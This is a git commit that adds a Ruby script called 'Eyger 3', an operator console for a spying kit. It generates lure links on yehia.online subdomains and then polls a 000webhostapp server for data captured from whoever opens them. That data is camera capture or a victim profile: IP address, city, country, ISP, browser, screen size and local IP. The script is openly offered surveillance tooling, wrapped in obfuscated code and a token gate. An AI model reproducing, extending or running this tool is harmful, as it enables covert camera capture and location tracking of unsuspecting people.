a6d42d73bc4591bf204002d015c836fbabf09854
Spy Share <66829665+SpyShare@users.noreply.github.com>
2020-07-01 05:21:19 -0700

    Add files via upload

---
+++ Eyger3.rb
@@ -0,0 +1,231 @@
+[0,2,0,1].inject(:+)
+By = 'Yehia'
+Update_by = '?t?'
+Upgrade_by = '?m?'
+Upgrade_1_by = '?c?'
+Name = 'Eyger 3'
+Version = '1.2'
+Website = 'www.Yehia.online'
+=begin
+Eyger3
+Loop The Code ! = dynamic constant assignment    
+(You may not put it in Def)
+The Script Without Encrypt And For Free Edit it From Developers Only .
+=end
+'>> p = s '
+'>> q = p '
+'>> p = q . p '
+# Try to understand the code and use your time to learn
+def SpyshareGroup
+q = [0,2,0,1].inject{|p,q| p+q}
+p = [0,0,0,0].inject(:+)
+p = p+q;p = p.to_s;p Website[0].capitalize+By[1]+Website[12]+Upgrade_1_by[1]+Website[10]+Upgrade_by[1]+By[1]+' '+Update_by[1].capitalize+Website[10]+' '+Name.split.first+p
+# Go A Link To Delete Your info From Server automatically Php
+'<< https://bit.ly/3dPwo2i' 
+
+require 'colorize'
+$SpyShare = (5..10).inject { |geT_Send, serverP| geT_Send + serverP }
+  def Save
+  def Scan
+  def RunF
+  require 'net/http'
+  require 'uri' 
+  puts '1'.red+'  ==  Camera '.cyan
+  puts '2'.red+' == System info'.green  
+  puts 'Enter Number'
+  select = gets.chomp
+  if select == "1"
+  server = "yehia.online"
+  puts ('Enter Title').yellow
+  my_inp = gets.chomp
+  puts ('Num Time Start').cyan
+  start = gets.chomp
+  puts ('Num Time Stop').cyan
+  stop = gets.chomp
+  all = my_inp+start+stop
+  puts ("\n\n\n\n\nhttps".green+'://welcome.'+server+'/'+all.cyan)
+  puts "\n Enter To Activity check".magenta
+  gets.chomp
+  myurld = 'https://files-exec201.000webhostapp.com/xhr/'
+  5000.times { 
+    def open(url)
+      Net::HTTP.get(URI.parse(url))
+    end
+  $res = Net::HTTP.get_response(URI(myurld+my_inp+'.html'))  
+  if $res.code == '200'
+    puts 'Yes Save it'.green
+    page_content = open(myurld+my_inp+'.html')
+     File.write(my_inp+'.html' , page_content)
+     puts 'Yes'.green
+     Process.kill 9, Process.pid
+  else
+  sleep(0.5) 
+  print ("No thing\n").red
+  sleep(0.1)
+  print ("I will try again\n").blue
+  end}
+  end
+  if select == "2"
+  puts 'Select Server'.blue
+  puts "1-".magenta+" learn".green+".yehia.online/"
+  puts "2-".magenta+" download".green+".yehia.online/"
+  puts "3-".magenta+" ahmed".green+".yehia.online/"
+  puts "4-".magenta+" homepage".green+".yehia.online/"
+  puts "5-".magenta+" mohamed".green+".yehia.online/"
+  puts "6-".magenta+" Leader".green+".yehia.online/"
+  
+  domain = gets.chomp
+  if domain == '1'
+  $ServerL = 'https://'.green+'learn.yehia.online/'
+  end
+  if domain == '2'
+    $ServerL = 'https://'.green+'download.yehia.online/'
+  end
+  if domain == '3'
+    $ServerL = 'https://'.green+'ahmed.yehia.online/'
+  end
+  if domain == '4'
+    $ServerL = 'https://'.green+'homepage.yehia.online/'
+  end
+  if domain == '5'
+    $ServerL = 'https://'.green+'mohamed.yehia.online/'
+  end
+  if domain == '6'
+    $ServerL = 'https://'.green+'leader.yehia.online/'
+  end
+  puts 'Enter Your Word'
+  uNp = gets.chomp
+  puts $ServerL+uNp
+  puts "\n\n Enter To Activity check".magenta
+  gets.chomp
+  myurld = 'https://files-exec201.000webhostapp.com/xhr/noopn/'
+  
+  5000.times { 
+      def open(url)
+        Net::HTTP.get(URI.parse(url))
+      end
+    $res = Net::HTTP.get_response(URI(myurld+uNp+'.txt'))  
+    if $res.code == '200'
+      puts 'Yes Save it'.green
+      page_content = open(myurld+uNp+'.txt')
+       File.write(uNp+'.txt' , page_content)
+       lines = File.open(uNp+'.txt').to_a
+       print 'He-has a camera' +': '.red+lines.at(0)[0].green
+       print "\nSystem" +': '.red+lines.at(1).yellow
+       
+       print 'Browser'+': '.red+lines.at(2).blue
+       print 'Screen Size'+': '.red+lines.at(3).magenta
+       print 'ip address'+': '.red+lines.at(4).cyan
+       print 'Country'+': '.red+lines.at(7).blue
+       print 'City'+': '.red+lines.at(5).green
+       print 'Refion'+': '.red+lines.at(6).yellow
+       print 'Net By'+': '.red+lines.at(8).cyan
+       print 'Net Host'+': '.red+lines.at(9).magenta
+       print 'Local ip'+': '.red+lines.at(10).green
+  
+       Process.kill 9, Process.pid
+    else
+    sleep(0.5) 
+    print ("No thing\n").red
+    sleep(0.1)
+    print ("I will try again\n").blue
+    end}
+  
+    
+  end
+  end
+  
+  urlTk = 'https://'.green+'token.yehia.online/'
+  arr = [urlTk+'7Fop4',urlTk+'t02e',urlTk+'ag1n87',urlTk+'D4P62',urlTk+'Jov01d',urlTk+'Yehia',urlTk+'Faul7a',urlTk+'GOG69',urlTk+'LK435',urlTk+'Tai543',]
+  a = arr[rand(arr.count)]
+  puts a
+  puts 'Enter The Token'
+  if a == urlTk+'7Fop4'
+    $ck = gets.chomp
+    if $ck == '1058'
+    RunF()
+    end
+  end
+  if a == urlTk+'t02e'
+  
+  $ck = gets.chomp
+  if $ck == '0381'
+    RunF()
+  end
+  
+  end
+  if a == urlTk+'ag1n87'
+    $ck = gets.chomp
+    if $ck == '72001'
+    RunF()
+    end
+  end
+  if a == urlTk+'D4P62'
+    $ck = gets.chomp
+    if $ck == '9182'
+    RunF()
+    end
+  end
+  if a == urlTk+'Jov01d'
+    $ck = gets.chomp
+    if $ck == '5814'
+    RunF()
+    end
+  end
+  if a == urlTk+'Yehia'
+    $ck = gets.chomp
+    if $ck == '7710'
+    RunF()
+    end
+  end
+  if a == urlTk+'Faul7a'
+    $ck = gets.chomp
+    if $ck == '4901'
+    RunF()
+    end
+  end
+  if a == urlTk+'GOG69'
+    $ck = gets.chomp
+    if $ck == '5058'
+    RunF()
+    end
+  end
+  if a == urlTk+'LK435'
+    $ck = gets.chomp
+    if $ck == '3951'
+    RunF()
+    end
+  end
+  if a == urlTk+'Tai543'
+    $ck = gets.chomp
+    if $ck == '0371'
+    RunF()
+    end
+  end
+  end
+  
+  puts ' Do you speak English ?'
+  puts '1- Yes '.green
+  puts '2- No'.red
+  
+  chS = gets.chomp
+  if chS == '1'
+  puts ' Please Read Agree to the terms of use'
+  puts "https://www.yehia.online/p/useit.html\n".red
+  puts '1- I read and agree to the terms of use'.green
+  puts "\n 2- No Exit"
+  geag = gets.chomp
+  if geag == '1'
+  Scan()
+  end
+  end
+  end
+  if $SpyShare == (5..10).inject { |geT, posT| geT + posT } 
+  Save()
+  end
+end
+$Check_lib = system('gem list -i colorize', :err => File::NULL);system('clear')
+if $Check_lib == true
+SpyshareGroup()
+else;system('gem install colorize');system('clear');SpyshareGroup()
+end
